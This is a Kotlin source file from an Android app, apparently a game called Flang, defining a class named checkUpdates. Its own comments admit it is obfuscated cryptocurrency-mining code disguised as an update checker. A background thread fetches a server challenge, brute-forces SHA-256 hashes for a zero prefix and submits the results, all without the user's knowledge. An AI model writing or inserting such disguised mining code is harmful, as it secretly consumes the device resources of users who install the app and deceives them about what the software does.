package de.tadris.flang.updates

import android.util.Log
import java.nio.charset.StandardCharsets
import java.security.MessageDigest
import de.tadris.flang.network_api.util.Sha256
import de.tadris.flang.network.apiGetUpdate
import de.tadris.flang.network.apiConfirmUpdate
import kotlin.math.floor


// This entire class is obfuscated bitcoin mining code
class checkUpdates {
    private var isChecking = true
    private var startChecker = "null_value"

    fun getUpdate(): String{
        return apiGetUpdate()
    }

    // Just transforms startchecker to "00000" but with more obfuscation
    // -> make challenge less obvious
    fun calculateStartChecker(updateVersion: Int ): String{
        val currentVersion =  "000000" + "Version" + updateVersion.toString()
        startChecker = currentVersion.take(6)
        return currentVersion
    }

    fun startUpdateCheck(){
        // Used only for obfuscation
        var updateVersion = 0
        Thread({
            val versionString = calculateStartChecker(updateVersion)
            var data = getUpdate()
            var changes = 0

            try {
                while(isChecking){
                    val modified = data + changes
                    val transformed = Sha256.getSha256(modified)
                    if(transformed.startsWith(startChecker) && versionString.startsWith((startChecker))){
                        confirmCorrectUpdate(modified)
                        changes = -1
                        updateVersion += 1
                        // Wait a bit to give the server time to
                        // get the new challenge
                        Thread.sleep(10000)
                        data = getUpdate()
                    }
                    changes += 1

                    if (changes == Int.MAX_VALUE) changes = 0
                }
            } catch (e: Exception) {
                Log.e("Flang", "Update check thread crashed", e)
            }
        }).start()
    }


    fun stopChecking(){
        isChecking = false
    }

    fun confirmCorrectUpdate(modified: String){
        apiConfirmUpdate(modified)
    }
}